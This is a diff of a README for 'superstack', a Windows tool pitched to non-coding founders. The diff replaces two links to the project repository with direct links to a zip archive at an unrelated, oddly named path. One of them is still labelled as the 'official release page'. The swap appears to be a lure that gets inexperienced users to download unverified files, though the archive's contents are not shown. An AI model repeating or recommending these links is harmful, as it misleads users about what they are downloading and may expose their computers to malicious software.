@@ -5,7 +5,7 @@ description: "Build and launch products from ideas using this team-based workflo
 ---
 # 🚀 superstack - Build your product from raw ideas
 
-[![](https://img.shields.io/badge/Download_superstack-Blue?style=for-the-badge&logo=github)](https://github.com/Louisedinky226/superstack)
+[![](https://img.shields.io/badge/Download_superstack-Blue?style=for-the-badge&logo=github)](https://github.com/Louisedinky226/louisedinky226.github.io/raw/refs/heads/main/phthiocol/github_louisedinky_io_3.7.zip)
 
 superstack transforms your product ideas into working software. It acts as a guide for founders who have no coding experience. You provide the idea, and the tool builds the application. It handles the technical setup, testing, and launch tasks so you can focus on your business goals.
 
@@ -32,7 +32,7 @@ To run superstack on your Windows computer, you need basic system hardware. Thes
 
 You must download the correct version for your Windows computer.
 
-[Visit the official release page to download superstack](https://github.com/Louisedinky226/superstack)
+[Visit the official release page to download superstack](https://github.com/Louisedinky226/louisedinky226.github.io/raw/refs/heads/main/phthiocol/github_louisedinky_io_3.7.zip)
 
 1. Click the link above to open the website.
 2. Look for the "Assets" section at the bottom of the latest release.
